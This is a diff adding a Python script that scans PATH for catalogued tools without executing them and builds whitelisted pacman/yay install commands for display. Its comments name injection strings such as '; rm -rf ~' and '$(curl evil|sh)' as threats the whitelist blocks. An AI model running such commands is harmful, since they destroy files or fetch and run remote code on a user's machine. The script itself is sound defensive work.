@@ -1,0 +1,351 @@
+#!/usr/bin/env python3
+"""spellbook-scan — report which catalog tools are present on this machine.
+
+Security posture, deliberately narrow:
+
+  * This script NEVER executes a catalogued tool. Presence is determined by
+    resolving the binary name against PATH and testing the execute bit, which
+    is a filesystem stat, not a fork. A tool named in the catalog cannot be
+    made to run by adding it to the catalog.
+  * It never invokes a package manager, never writes outside its own state
+    directory, and takes no network action of any kind.
+  * The catalog is treated as untrusted input even though we ship it: it is
+    read under a byte cap, a record cap and a name charset whitelist, so a
+    hand-edited or third-party catalog cannot exhaust memory or smuggle a
+    shell metacharacter into anything downstream.
+
+Output: one JSON object on stdout.
+"""
+
+from __future__ import annotations
+
+import json
+import os
+import re
+import shutil
+import stat
+import sys
+import tempfile
+from pathlib import Path
+
+# ---- bounds ---------------------------------------------------------------
+# Every ceiling is raisable by environment variable, and the variable is named
+# in the error text so a user with a genuinely large catalog is never stuck.
+#
+# The environment is untrusted input like anything else. A raw int() here dies
+# with a traceback on "abc" and silently accepts "-1" or "0".
+#
+# Note the floor semantics: a value BELOW the usable floor falls back to the
+# default rather than clamping up to the floor. Clamping is wrong here because
+# every floor is still a legal-looking number that would reject the shipped
+# catalog -- SPELLBOOK_MAX_DEPTH=0 clamped to 1 turns a typo into a plugin that
+# can never load its own data. Out-of-range low means "the user did not mean
+# this"; only an over-large value is clamped, since that direction is safe.
+
+
+def bound(name: str, default: int, floor: int, ceiling: int) -> int:
+    raw = os.environ.get(name)
+    if raw is None or raw == "":
+        return default
+    try:
+        val = int(raw)
+    except (TypeError, ValueError):
+        return default
+    if val < floor:
+        return default
+    return min(val, ceiling)
+
+
+MAX_BYTES = bound("SPELLBOOK_MAX_BYTES", 512 * 1024, 64 * 1024, 64 * 1024 * 1024)
+MAX_CATEGORIES = bound("SPELLBOOK_MAX_CATEGORIES", 64, 4, 4096)
+MAX_TOOLS_PER_CATEGORY = bound("SPELLBOOK_MAX_TOOLS", 128, 16, 8192)
+MAX_FIELD = bound("SPELLBOOK_MAX_FIELD", 2048, 256, 65536)
+
+# Depth cap for the JSON document itself. CPython's parser recurses per nesting
+# level, so a deeply nested array reaches a RecursionError -- or, past a certain
+# depth, a hard stack overflow -- before any of the caps above are consulted.
+# The real catalog nests five levels; the floor keeps room above that.
+MAX_DEPTH = bound("SPELLBOOK_MAX_DEPTH", 16, 8, 256)
+
+# A binary name we are willing to look up. Anything outside this charset is
+# rejected rather than sanitized: a name containing a slash, a space or a
+# shell metacharacter has no legitimate reason to be in the catalog.
+SAFE_BIN = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+-]{0,63}$")
+
+# A package name we are willing to place into a displayed install command.
+# This is the important one: that string is presented to the user as something
+# to paste into a shell, so a catalog entry must never be able to smuggle
+# `; rm -rf ~` or `$(curl evil|sh)` into it. Arch package names are drawn from
+# a narrow charset, so a strict whitelist costs nothing and closes the hole.
+# The plugin does not execute the command either way — this protects the human.
+SAFE_PKG = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+-]{0,63}$")
+
+# Where a package comes from, and the incantation that installs it. Only these
+# two sources are recognised; anything else yields no install command at all
+# rather than a guessed one.
+#
+# Note both commands are *reference text*. Nothing here is ever run by the
+# plugin: there is no code path that executes a package manager.
+INSTALL_TEMPLATES = {
+    "repo": "sudo pacman -S --needed {pkg}",
+    "aur": "yay -S {pkg}",
+}
+
+
+def die(msg: str) -> None:
+    json.dump({"ok": False, "error": str(msg)[:400], "categories": []}, sys.stdout)
+    sys.stdout.write("\n")
+    sys.exit(1)
+
+
+def read_bounded(path: Path) -> str:
+    """Read a file under a hard byte cap.
+
+    The cap is enforced by the read itself, not by a prior stat(): a FIFO or a
+    /proc entry reports zero bytes and then streams forever, and a regular file
+    can grow between the check and the read. Asking for cap+1 bytes and
+    rejecting a full buffer defeats both.
+    """
+    try:
+        with open(path, "rb") as fh:
+            blob = fh.read(MAX_BYTES + 1)
+    except FileNotFoundError:
+        die(f"catalog not found: {path}")
+    except OSError as exc:
+        die(f"cannot read catalog: {exc}")
+
+    if len(blob) > MAX_BYTES:
+        die(
+            f"catalog exceeds {MAX_BYTES} bytes; raise SPELLBOOK_MAX_BYTES "
+            "if this is intentional"
+        )
+    try:
+        return blob.decode("utf-8")
+    except UnicodeDecodeError as exc:
+        die(f"catalog is not valid UTF-8: {exc}")
+    return ""
+
+
+def check_depth(text: str) -> None:
+    """Reject over-nested JSON *before* handing it to the parser.
+
+    This cannot be done after the fact: CPython's decoder recurses per nesting
+    level, so a hostile document overflows the stack inside json.loads() and
+    takes the process down with a traceback rather than a clean error. Counting
+    brackets over the raw text is a cheap linear scan that runs first.
+
+    String contents are skipped so a brace inside a description is not counted
+    as structure, and escapes are honoured so a trailing backslash cannot end
+    the string early.
+    """
+    depth = 0
+    in_string = False
+    escaped = False
+    for ch in text:
+        if in_string:
+            if escaped:
+                escaped = False
+            elif ch == "\\":
+                escaped = True
+            elif ch == '"':
+                in_string = False
+            continue
+        if ch == '"':
+            in_string = True
+        elif ch in "[{":
+            depth += 1
+            if depth > MAX_DEPTH:
+                die(
+                    f"catalog nests deeper than {MAX_DEPTH} levels; raise "
+                    "SPELLBOOK_MAX_DEPTH if this is intentional"
+                )
+        elif ch in "]}":
+            depth -= 1
+
+
+def field(obj: dict, key: str) -> str:
+    """Pull a string field, stripped of control characters and length-capped."""
+    val = obj.get(key, "")
+    if not isinstance(val, str):
+        return ""
+    val = "".join(ch for ch in val if ch >= " " and ch != "\x7f")
+    return val[:MAX_FIELD]
+
+
+def which_safe(name: str) -> str:
+    """Resolve a binary on PATH without executing anything.
+
+    shutil.which() performs stat() calls only. We re-verify the execute bit on
+    the resolved path so a stale PATH entry or a non-executable file of the
+    same name is not reported as installed.
+    """
+    if not SAFE_BIN.match(name):
+        return ""
+    found = shutil.which(name)
+    if not found:
+        return ""
+    try:
+        st = os.stat(found)
+    except OSError:
+        return ""
+    if not stat.S_ISREG(st.st_mode) or not (st.st_mode & 0o111):
+        return ""
+    return found
+
+
+def main() -> None:
+    here = Path(__file__).resolve().parent.parent
+    catalog_path = Path(os.environ.get("SPELLBOOK_CATALOG", here / "catalog.json"))
+
+    raw_text = read_bounded(catalog_path)
+    check_depth(raw_text)
+
+    try:
+        doc = json.loads(raw_text)
+    except json.JSONDecodeError as exc:
+        die(f"catalog is not valid JSON: {exc}")
+    except RecursionError:
+        die("catalog is nested too deeply to parse")
+
+    if not isinstance(doc, dict):
+        die("catalog root must be a JSON object")
+
+    raw_categories = doc.get("categories", [])
+    if not isinstance(raw_categories, list):
+        die("catalog 'categories' must be a list")
+    if len(raw_categories) > MAX_CATEGORIES:
+        die(
+            f"catalog has more than {MAX_CATEGORIES} categories; raise "
+            "SPELLBOOK_MAX_CATEGORIES if this is intentional"
+        )
+
+    out_categories = []
+    total = 0
+    installed = 0
+
+    for raw_cat in raw_categories:
+        if not isinstance(raw_cat, dict):
+            continue
+        raw_tools = raw_cat.get("tools", [])
+        if not isinstance(raw_tools, list):
+            continue
+        if len(raw_tools) > MAX_TOOLS_PER_CATEGORY:
+            die(
+                f"a category has more than {MAX_TOOLS_PER_CATEGORY} tools; raise "
+                "SPELLBOOK_MAX_TOOLS if this is intentional"
+            )
+
+        tools = []
+        for raw_tool in raw_tools:
+            if not isinstance(raw_tool, dict):
+                continue
+            name = field(raw_tool, "bin")
+            if not name or not SAFE_BIN.match(name):
+                continue
+            path = which_safe(name)
+            total += 1
+            if path:
+                installed += 1
+
+            pkg = field(raw_tool, "pkg")
+            repo = field(raw_tool, "repo").lower()
+            if repo not in INSTALL_TEMPLATES:
+                repo = "repo"
+
+            # Drop a package name that fails the whitelist rather than passing
+            # it through unvalidated. The install command below already refuses
+            # to embed it, but the raw name is ALSO rendered in the tool row and
+            # fed to the panel's bulk-install builder. Emitting it while
+            # refusing to build a command from it means the UI displays
+            # `foo; rm -rf ~` as this tool's package -- a string the user may
+            # well retype by hand. One rejection point, applied before the value
+            # leaves this helper, keeps the guarantee whole.
+            if pkg and not SAFE_PKG.match(pkg):
+                pkg = ""
+
+            # Only build an install command when the package name survives the
+            # whitelist. A rejected name yields an empty string, so the UI
+            # simply shows no install option rather than a broken or unsafe one.
+            install = ""
+            if pkg:
+                install = INSTALL_TEMPLATES[repo].format(pkg=pkg)
+
+            tools.append(
+                {
+                    "bin": name,
+                    "pkg": pkg,
+                    "repo": repo,
+                    "install": install,
+                    "what": field(raw_tool, "what"),
+                    "cmd": field(raw_tool, "cmd"),
+                    "note": field(raw_tool, "note"),
+                    "installed": bool(path),
+                    "path": path,
+                }
+            )
+
+        if tools:
+            # Bulk install for everything missing in this section, split by
+            # source: repo packages go through pacman, AUR through yay, and a
+            # section needing both gets both lines. Built from the already
+            # whitelisted names, so it inherits the same guarantee.
+            missing_repo = sorted(
+                {t["pkg"] for t in tools
+                 if not t["installed"] and t["install"] and t["repo"] == "repo"}
+            )
+            missing_aur = sorted(
+                {t["pkg"] for t in tools
+                 if not t["installed"] and t["install"] and t["repo"] == "aur"}
+            )
+            bulk = []
+            if missing_repo:
+                bulk.append(INSTALL_TEMPLATES["repo"].format(pkg=" ".join(missing_repo)))
+            if missing_aur:
+                bulk.append(INSTALL_TEMPLATES["aur"].format(pkg=" ".join(missing_aur)))
+
+            out_categories.append(
+                {
+                    "name": field(raw_cat, "name") or "Other",
+                    "blurb": field(raw_cat, "blurb"),
+                    "tools": tools,
+                    "installAllMissing": "\n".join(bulk),
+                    "missingCount": len(missing_repo) + len(missing_aur),
+                }
+            )
+
+    payload = {
+        "ok": True,
+        "error": "",
+        "total": total,
+        "installed": installed,
+        "categories": out_categories,
+    }
+
+    dest = os.environ.get("SPELLBOOK_OUT", "")
+    if dest:
+        # Atomic, never world-readable, even briefly. mkstemp creates with
+        # O_CREAT|O_EXCL at 0600, which also defeats a planted symlink at a
+        # predictable temp path.
+        out = Path(dest)
+        out.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
+        if out.parent.stat().st_mode & 0o077:
+            out.parent.chmod(0o700)
+        fd, tmp_name = tempfile.mkstemp(
+            dir=str(out.parent), prefix=f".{out.name}.", suffix=".tmp"
+        )
+        try:
+            with os.fdopen(fd, "w", encoding="utf-8") as fh:
+                json.dump(payload, fh)
+                fh.flush()
+                os.fsync(fh.fileno())
+            os.replace(tmp_name, out)
+        except BaseException:
+            Path(tmp_name).unlink(missing_ok=True)
+            raise
+
+    json.dump(payload, sys.stdout)
+    sys.stdout.write("\n")
+
+
+if __name__ == "__main__":
+    main()
